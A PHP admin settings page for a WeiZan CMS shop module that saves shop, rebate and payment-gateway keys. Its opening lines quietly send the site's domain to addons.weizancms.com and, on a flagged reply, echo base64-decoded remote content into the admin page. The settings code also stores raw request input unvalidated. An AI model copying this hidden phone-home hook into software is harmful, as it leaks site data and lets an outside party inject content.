<?php
global $_W, $_GPC;
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$settings = pdo_fetchcolumn("SELECT settings FROM ".tablename('uni_account_modules')." WHERE module = :module AND uniacid = :uniacid", array(':module' => 'weliam_indiana', ':uniacid' => $_W['uniacid']));
$settings = unserialize($settings);
$styles = array();
$dir = IA_ROOT . "/addons/weliam_indiana/template/mobile/";
if ($handle = opendir($dir)) {
	while (($file = readdir($handle)) !== false) {
		if ($file != ".." && $file != ".") {
			if (is_dir($dir . "/" . $file)) {
				$styles[] = $file;
			} 
		} 
	} 
	closedir($handle);
}
if(checksubmit()) {
	$dat = array(
        'share_title' => $_GPC['share_title'],
        'share_image' => $_GPC['share_image'],
        'share_desc' => $_GPC['share_desc'],
        
        'm_pay'=>$_GPC['m_pay'],
        'm_send'=>$_GPC['m_send'],
        'm_suc'=>$_GPC['m_suc'],
        'm_ref'=>$_GPC['m_ref'],
        'm_money'=>$_GPC['m_money'],
        'm_open'=>$_GPC['m_open'],
        
		//短信通知参数配置
		'note_appkey'=>$_GPC['note_appkey'],
		'note_secretKey'=>$_GPC['note_secretKey'],
		'note_code'=>$_GPC['note_code'],
		'note_sign'=>$_GPC['note_sign'],
        
		//商城信息参数
		'style'=>$_GPC['style'],
        'sname'=>$_GPC['sname'],
        'shoplogo'=>$_GPC['shoplogo'],
        'copyright'=>$_GPC['copyright'],
        'instruction'=>$_GPC['instruction'],
        'content' => htmlspecialchars_decode($_GPC['content']),
        'is_bingding'=>$_GPC['is_bingding'],			//是否开启微信账号绑定
        'auto_audit'=>$_GPC['auto_audit'],				//是否开启自动审核言论
        'buynum'=>$_GPC['buynum'],						//默认购买数
        'is_buynum'=>$_GPC['is_buynum'],				//是否开启购买选择
        'buy_bingding'=>$_GPC['buy_bingding'],				//是否开启绑定之后才能购买
        
        //返利
    	'level'=>$_GPC['level'],
    	'level1'=>$_GPC['level1'],
    	'level2'=>$_GPC['level2'],
    	'level3'=>$_GPC['level3'],
    	'credit1'=>$_GPC['credit1'],
    	'credit2'=>$_GPC['credit2'],
    	'creditstatus' => $_GPC['creditstatus'],
    	'invitepicarr' => $_GPC['invitepicarr'],
    	'recharge' => $_GPC['recharge'],
        'rechargestatus' => $_GPC['rechargestatus'],
        'creditBySingle' => $_GPC['creditBySingle'],
        
    	//各种支付开关
    	'switch_credit' => $_GPC['switch_credit'],	//服务商支付开关
    	'switch_sys' => $_GPC['switch_sys'],	//微赞支付开关
		'switch_ping' => $_GPC['switch_ping'],	//ping++支付开关
		'switch_yunpay' => $_GPC['switch_yunpay'],	//云支付支付开关
		'switch_iapppay' => $_GPC['switch_iapppay'],	//爱贝支付开关
		'switch_fwpay' => $_GPC['switch_fwpay'],	//服务商支付开关
		
		//系统支付开关
		'sys_wxpay' => $_GPC['sys_wxpay'],			//微赞微信支付
		'sys_alipay' => $_GPC['sys_alipay'],		//微赞支付宝支付
		'sys_ylpay' => $_GPC['sys_ylpay'],			//微赞银联支付
		'sys_bdpay' => $_GPC['sys_bdpay'],			//微赞百度钱包支付
		
		//ping++支付参数
		'paytype' => $_GPC['paytype'],
		'App_ID' => $_GPC['App_ID'],
		'Secret_Key' => $_GPC['Secret_Key'],
		'Publishable_Key' => $_GPC['Publishable_Key'],
		'PUBLIC_KEY' => $_GPC['PUBLIC_KEY'],
		'isalipay' => $_GPC['isalipay'],
		'iswxpay' => $_GPC['iswxpay'],
		'isjdpay' => $_GPC['isjdpay'],
		'isbfbpay' => $_GPC['isbfbpay'],
		'ispayee' => $_GPC['ispayee'],
		
		//关注参数设置
		'followed_image'=>$_GPC['followed_image'],
		'followed_isbuy'=>$_GPC['followed_isbuy'],
		'credit1_followed'=>$_GPC['credit1_followed'],
		'iscredit1_followed'=>$_GPC['iscredit1_followed'],
		'duobao_followed'=>$_GPC['duobao_followed'],
		'followed_message'=>$_GPC['followed_message'],
		'buy_followed'=>!empty($_GPC['buy_followed'])?$_GPC['buy_followed']:0, 		//购买返积分
		
		//云支付
		'wxpaystatus' => $_GPC['wxpaystatus'],
		'yunpay_partner' => $_GPC['yunpay_partner'],
		'yunpay_key' => $_GPC['yunpay_key'],
		'yunpay_seller_email' => $_GPC['yunpay_seller_email'],
		
		//服务商、特约商户
		'fw_appid'=>$_GPC['fw_appid'],
		'fw_mch_id'=>$_GPC['fw_mch_id'],
		'fw_api'=>$_GPC['fw_api'],
		'ty_sub_mch_id'=>$_GPC['ty_sub_mch_id'],
		'ty_appid'=>$_GPC['ty_appid'],
		
		//爱贝支付参数
		'iapppay_appid'=>$_GPC['iapppay_appid'],
		'iapppay_appv_key'=>$_GPC['iapppay_appv_key'],
		'iapppay_platp_key'=>$_GPC['iapppay_platp_key'],
		
		//app设置参数
		'switch_accredit'=>$_GPC['switch_accredit'],
		'switch_appAlipay'=>$_GPC['switch_appAlipay'],
		'ALI_PUBLIC_KEY'=>$_GPC['ALI_PUBLIC_KEY'],

		//判断是否进行夺宝码重新分配后的更新
		'isdb_change' => !empty($_GPC['isdb_change'])?$_GPC['isdb_change']:0,
	);
	$paydata['yunpay']=array(
		//云支付
		'switch' => 1,
		'partner' => $_GPC['yunpay_partner'],
		'key' => $_GPC['yunpay_key'],
		'seller_email' => $_GPC['yunpay_seller_email'],
	);
	if (!saveSettings($dat)) {
		message('保存信息失败','referer','error');
	} else {
		$settings = uni_setting($_W['uniacid'], array('payment'));			
		if(!in_array($paydata,$settings)){
			$settings['payment']['yunpay']= $paydata['yunpay'];
			$data = iserializer($settings['payment']);		
			pdo_update('uni_settings', array('payment' => $data), array('uniacid' => $_W['uniacid']));
		}
		message('保存信息成功','referer','success');
	}
}

// 模板中需要用到 "tpl" 表单控件函数的话, 记得一定要调用此方法.
load()->func('tpl');

//这里来展示设置项表单
include $this->template('setting');